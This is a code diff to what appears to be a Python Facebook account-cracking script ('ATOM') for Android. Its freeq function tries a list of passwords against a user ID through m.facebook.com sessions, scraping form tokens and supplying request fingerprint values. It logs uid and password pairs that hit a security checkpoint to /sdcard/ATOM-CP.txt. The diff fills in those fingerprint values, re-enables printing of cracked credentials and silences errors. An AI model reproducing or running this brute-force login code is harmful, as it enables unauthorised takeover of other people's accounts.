@@ -1742,7 +1742,6 @@ def freeq(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
             lsd_value = re.search(r'name="lsd" value="(.*?)"', str(free_fb)).group(1)
@@ -1767,10 +1766,10 @@ def freeq(uid,pwx,tl):
     '__s': '9i0mpn:tl7b2z:wtg4vs',
     '__hsi': '7530975347099937606',
     '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK5o4q0HU1IEGdwtU2ewbS1Lwqo15E6O1FwlU6KaxyU5N90HwtU5K0UEhwjE',
-    '__csr': '...',
-    '__hsdp': '...',
-    '__hblp': '...',
-    '__sjsp': '...',
+    '__csr': 'g_8AltPmJcACp2qAarSaXyp8mKSGhbKJ2Vf-Hypp7GmiBO5lG8BC8CiuiB9btqaKBcIWGdyoKE8EcoaGwSyU8Uixmi5ESu487i3W2C-7E4-10yVooU2iwHwkGwnUaUb8iGA2e0Mo3MxicwkU2kw4Aw4Bwq8coy2u0-E2vxm0137UjgoQU08yS00jNO8G00OK8K09Nw1Jaaw7uzy0hU05P60cvw0ETo',
+    '__hsdp': 'gyxWxW43AIR1gOzQH88hUCUEk8yVah4Je6org-222SbUcU5y2OdyE0Ia3F2E1fUG3ma8PZ8w-q2y7Q5U460BU1f83Exe0NE0_C04DE2ow1E60X40bsxki0BC1Qw1nq04mo0oow2GU11E0qkw0EUw3i80xK09Pw',
+    '__hblp': '01SK05Bo0Du02XC0cswcC0bzw3XU0Uq0xo2nw1d61Jwg85C0lq3C0M811E0LG0uW0qG06OU0PG362u0l2mU5C1qw4gw77wkU0De',
+    '__sjsp': 'gyxWxW43AIR1gMiiIwx7yryxgybAF4iQUpxJ3U88boLwPwm8b8Saw2MEeAaw4_yEdoEzeQC49E4x1u11w9u0jO0W8jwcq029y0C80tKg0JO5h82mo7i05tE',
     '__comet_req': '1',
     'lsd': lsd_value,
     'jazoest': jazoest_value,
@@ -1871,7 +1870,7 @@ def freeq(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1881,7 +1880,7 @@ def freeq(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 def d(uid,pwx,tl):
